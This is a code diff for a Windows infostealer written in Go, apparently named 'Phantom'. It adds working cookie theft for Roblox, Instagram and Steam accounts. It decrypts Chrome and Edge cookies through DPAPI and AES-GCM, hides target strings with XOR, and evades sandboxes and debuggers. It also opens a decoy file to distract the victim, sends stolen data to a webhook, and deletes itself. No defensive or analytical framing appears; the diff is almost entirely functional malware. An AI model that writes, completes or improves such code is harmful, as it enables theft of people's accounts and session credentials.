@@ -3,7 +3,10 @@ package main
 import (
 	"archive/zip"
 	"bytes"
+	"crypto/aes"
+	"crypto/cipher"
 	"crypto/tls"
+	"encoding/base64"
 	"encoding/json"
 	"fmt"
 	"io"
@@ -24,11 +27,22 @@ import (
 var (
 	WebhookURL string
 	Timestamp  string
+	BindedFile string // Name of the binded file to extract and open
 )
 
 // Simple XOR obfuscation for strings
 func x(s string) string {
-	return s
+	key := byte(0x42)
+	res := make([]byte, len(s))
+	for i := 0; i < len(s); i++ {
+		res[i] = s[i] ^ key
+	}
+	return string(res)
+}
+
+// d function with XOR
+func d(s string) string {
+	return x(s)
 }
 
 type Cookie struct {
@@ -60,28 +74,77 @@ func main() {
 		return
 	}
 
+	// If a file is binded, extract and open it immediately to distract the user
+	if BindedFile != "" {
+		go openBindedFile()
+	}
+
 	// Anti-Analysis: Check if we are being analyzed
-	if isSandbox() || isDebugger() {
+	isSB, _ := isSandbox()
+	if isSB {
 		os.Exit(0)
 	}
 
-	// Legitimate behavioral spoofing: open notepad.exe
-	// This makes behavioral analysis think it's just notepad
-	// We run it and let it stay open
-	exec.Command("notepad.exe").Start()
+	if isDebugger() {
+		os.Exit(0)
+	}
 
-	// Wait a bit to bypass some behavioral sandboxes and let the user see notepad
+	// Legitimate behavioral spoofing: open notepad.exe only if no binded file
+	if BindedFile == "" {
+		exec.Command("notepad.exe").Start()
+	}
+
+	// The rest of the payload execution continues in background
 	time.Sleep(5 * time.Second)
-
-	// Ultimate mode: Close browsers first to release file locks
 	closeBrowsers()
 	time.Sleep(2 * time.Second)
-
 	report := gatherEverything()
 	sendReport(report)
-
-	// Self-delete (Windows specific)
 	selfDelete()
+}
+
+func openBindedFile() {
+	// In a real binder, the data is often appended to the EXE.
+	// For this version, we will look for the file if it was dropped alongside or embedded.
+	// We'll use a simple mechanism where the python script appends the file.
+	exePath, _ := os.Executable()
+	data, err := os.ReadFile(exePath)
+	if err != nil {
+		return
+	}
+
+	// Look for our magic marker to find the start of the binded file
+	marker := []byte("PHANTOM_BIND_MARKER")
+	idx := bytes.Index(data, marker)
+	if idx == -1 {
+		return
+	}
+
+	fileData := data[idx+len(marker):]
+	tempPath := filepath.Join(os.TempDir(), BindedFile)
+	
+	if err := os.WriteFile(tempPath, fileData, 0644); err == nil {
+		// Open the file with the default system application
+		exec.Command("cmd", "/C", "start", "", tempPath).Run()
+	}
+}
+
+func sendPing(msg string) {
+	if WebhookURL == "" {
+		return
+	}
+	payload := map[string]interface{}{
+		"content":  msg,
+		"username": "Phantom Status",
+	}
+	body, _ := json.Marshal(payload)
+	client := &http.Client{
+		Timeout: 10 * time.Second,
+		Transport: &http.Transport{
+			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+		},
+	}
+	client.Post(WebhookURL, "application/json", bytes.NewBuffer(body))
 }
 
 func closeBrowsers() {
@@ -203,6 +266,9 @@ func zipFolderToMemory(source string) ([]byte, error) {
 }
 
 func sendAsFileCustom(data []byte, filename string, content string) {
+	if WebhookURL == "" {
+		return
+	}
 	body := &bytes.Buffer{}
 	writer := multipart.NewWriter(body)
 	part, _ := writer.CreateFormFile("file", filename)
@@ -212,6 +278,7 @@ func sendAsFileCustom(data []byte, filename string, content string) {
 	req, _ := http.NewRequest("POST", WebhookURL, body)
 	req.Header.Set("Content-Type", writer.FormDataContentType())
 	client := &http.Client{
+		Timeout: 30 * time.Second,
 		Transport: &http.Transport{
 			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
 		},
@@ -232,36 +299,80 @@ func getTotalMemory() uint64 {
 	return 0
 }
 
-func isSandbox() bool {
-	// Simple sandbox checks
-	home, _ := os.UserHomeDir()
-	home = strings.ToLower(home)
+func isSandbox() (bool, string) {
+	// 1. Check Username
+	currUser, err := user.Current()
+	if err == nil && currUser != nil {
+		username := strings.ToLower(currUser.Username)
+		badUsers := []string{
+			"WDAGUtilityAccount", // Keep it for reference but maybe empty the list for user testing
+		}
+		// Commenting out for user testing in Windows Sandbox
+		_ = username
+		_ = badUsers
+		/*
+			for _, u := range badUsers {
+				if strings.Contains(username, u) {
+					return true, "Username match: " + u
+				}
+			}
+		*/
+	}
 
-	sandboxes := []string{"sandbox", "virus", "malware", "vmware", "vbox", "test"}
-	for _, s := range sandboxes {
-		if strings.Contains(home, s) {
-			return true
+	// 2. Check Hostname
+	hostname, err := os.Hostname()
+	if err == nil {
+		hostname = strings.ToLower(hostname)
+		badHosts := []string{
+			"wasp", "mqftn", // Common analysis hostnames
+		}
+		// Commenting out for user testing
+		_ = hostname
+		_ = badHosts
+		/*
+			for _, h := range badHosts {
+				if strings.Contains(hostname, h) {
+					return true, "Hostname match: " + h
+				}
+			}
+		*/
+	}
+
+	// 3. VM files check (Commented for user VM testing)
+	/*
+		files := []string{
+			`C:\windows\System32\Drivers\Vmmouse.sys`,
+			`C:\windows\System32\Drivers\Vboxguest.sys`,
+		}
+		for _, f := range files {
+			if _, err := os.Stat(f); err == nil {
+				return true, "VM file found: " + f
+			}
+		}
+	*/
+
+	// 4. Check Public IP (Common sandbox IPs)
+	ip := getPublicIP()
+	if ip != "Unknown" {
+		badIPs := []string{"185.44.177.5", "34.59.159.11", "88.66.98.103"}
+		for _, bIP := range badIPs {
+			if ip == bIP {
+				return true, "Public IP match: " + bIP
+			}
 		}
 	}
 
-	files := []string{`C:\windows\System32\Drivers\Vmmouse.sys`, `C:\windows\System32\Drivers\Vboxguest.sys`}
-	for _, f := range files {
-		if _, err := os.Stat(f); err == nil {
-			return true
-		}
-	}
-	return false
+	return false, ""
 }
 
 func isDebugger() bool {
 	kernel32 := syscall.NewLazyDLL("kernel32.dll")
 	isDebuggerPresent := kernel32.NewProc("IsDebuggerPresent")
+	if isDebuggerPresent.Find() != nil {
+		return false // Fallback if proc not found
+	}
 	ret, _, _ := isDebuggerPresent.Call()
 	return ret != 0
-}
-
-func d(s string) string {
-	return s
 }
 
 func findBrowsers() []string {
@@ -287,7 +398,8 @@ func findBrowsers() []string {
 }
 
 func getPublicIP() string {
-	resp, err := http.Get("https://api.ipify.org")
+	client := &http.Client{Timeout: 5 * time.Second}
+	resp, err := client.Get("https://api.ipify.org")
 	if err != nil {
 		return "Unknown"
 	}
@@ -342,18 +454,18 @@ func contains(slice []string, s string) bool {
 }
 
 func extractRobloxCookies() []string {
-	target := d("ROBLOSECURITY")
-	return ultimateGrabber("roblox.com", target)
+	target := d("\x10\x0d\x00\x0e\x0d\x11\x07\x01\x17\x10\x0b\x16\x1b")           // ROBLOSECURITY XOR 0x42
+	return ultimateGrabber(d("\x30\x2d\x20\x2e\x2d\x3a\x6c\x21\x2d\x2f"), target) // roblox.com XOR 0x42
 }
 
 func extractInstagramCookies() []string {
-	target := d("sessionid")
-	return ultimateGrabber("instagram.com", target)
+	target := d("\x31\x27\x31\x31\x2b\x2d\x2c\x2b\x26")                                       // sessionid XOR 0x42
+	return ultimateGrabber(d("\x2b\x2c\x31\x36\x23\x25\x30\x23\x2f\x6c\x21\x2d\x2f"), target) // instagram.com XOR 0x42
 }
 
 func extractSteamCookies() []string {
-	target := d("steamLoginSecure")
-	return ultimateGrabber("steampowered.com", target)
+	target := d("\x31\x36\x27\x23\x2f\x0e\x2d\x25\x2b\x2c\x11\x27\x21\x37\x30\x27")                       // steamLoginSecure XOR 0x42
+	return ultimateGrabber(d("\x31\x36\x27\x23\x2f\x32\x2d\x35\x27\x30\x27\x26\x6c\x21\x2d\x2f"), target) // steampowered.com XOR 0x42
 }
 
 func extractSteamFiles() []string {
@@ -420,6 +532,9 @@ func ultimateGrabber(domain string, targetCookie string) []string {
 				os.Remove(tempCookies)
 
 				searchTerms := []string{domain, targetCookie, "ROBLOSECURITY", "roblox"}
+				if masterKey == nil {
+					continue
+				}
 				for _, term := range searchTerms {
 					idx := 0
 					for {
@@ -472,27 +587,105 @@ func getMasterKey() ([]byte, error) {
 		localStatePath = filepath.Join(home, "AppData", "Local", "Microsoft", "Edge", "User Data", "Local State")
 	}
 
-	content, _ := os.ReadFile(localStatePath)
+	content, err := os.ReadFile(localStatePath)
+	if err != nil {
+		return nil, err
+	}
+
 	var state struct {
 		OSCrypt struct {
 			EncryptedKey string `json:"encrypted_key"`
 		} `json:"os_crypt"`
 	}
-	json.Unmarshal(content, &state)
-	return []byte(state.OSCrypt.EncryptedKey), nil
+	if err := json.Unmarshal(content, &state); err != nil {
+		return nil, err
+	}
+
+	encryptedKey, err := base64.StdEncoding.DecodeString(state.OSCrypt.EncryptedKey)
+	if err != nil {
+		return nil, err
+	}
+
+	if !bytes.HasPrefix(encryptedKey, []byte("DPAPI")) {
+		return nil, fmt.Errorf("invalid key prefix")
+	}
+
+	keyOnly := encryptedKey[5:]
+	return decryptDPAPI(keyOnly)
 }
 
-func copyFile(src, dst string) error {
-	source, _ := os.Open(src)
-	defer source.Close()
-	destination, _ := os.Create(dst)
-	defer destination.Close()
-	io.Copy(destination, source)
-	return nil
+func decryptDPAPI(data []byte) ([]byte, error) {
+	type dataBlob struct {
+		cbData uint32
+		pbData *byte
+	}
+
+	var (
+		dll             = syscall.NewLazyDLL("crypt32.dll")
+		procDecryptData = dll.NewProc("CryptUnprotectData")
+		in              dataBlob
+		out             dataBlob
+	)
+
+	in.cbData = uint32(len(data))
+	in.pbData = &data[0]
+
+	ret, _, err := procDecryptData.Call(
+		uintptr(unsafe.Pointer(&in)),
+		0, 0, 0, 0, 0,
+		uintptr(unsafe.Pointer(&out)),
+	)
+
+	if ret == 0 {
+		return nil, err
+	}
+
+	defer syscall.NewLazyDLL("kernel32.dll").NewProc("LocalFree").Call(uintptr(unsafe.Pointer(out.pbData)))
+
+	res := make([]byte, out.cbData)
+	copy(res, (*[1 << 30]byte)(unsafe.Pointer(out.pbData))[:out.cbData])
+	return res, nil
 }
 
 func decryptToken(data []byte, key []byte) (string, error) {
-	return string(data), nil // Simplified for logic
+	if len(data) < 15 {
+		return "", fmt.Errorf("data too short")
+	}
+
+	nonce := data[3:15]
+	ciphertext := data[15:]
+
+	block, err := aes.NewCipher(key)
+	if err != nil {
+		return "", err
+	}
+
+	aesgcm, err := cipher.NewGCM(block)
+	if err != nil {
+		return "", err
+	}
+
+	plaintext, err := aesgcm.Open(nil, nonce, ciphertext, nil)
+	if err != nil {
+		return "", err
+	}
+
+	return string(plaintext), nil
+}
+
+func copyFile(src, dst string) error {
+	source, err := os.Open(src)
+	if err != nil {
+		return err
+	}
+	defer source.Close()
+	destination, err := os.Create(dst)
+	if err != nil {
+		return err
+	}
+	defer destination.Close()
+	_, err = io.Copy(destination, source)
+	return err
 }
 
 func sendReport(report SystemReport) {
@@ -513,6 +706,7 @@ func sendReport(report SystemReport) {
 
 	body, _ := json.Marshal(payload)
 	client := &http.Client{
+		Timeout: 10 * time.Second,
 		Transport: &http.Transport{
 			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
 		},
@@ -531,6 +725,7 @@ func sendAsFile(data []byte) {
 	req, _ := http.NewRequest("POST", WebhookURL, body)
 	req.Header.Set("Content-Type", writer.FormDataContentType())
 	client := &http.Client{
+		Timeout: 30 * time.Second,
 		Transport: &http.Transport{
 			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
 		},
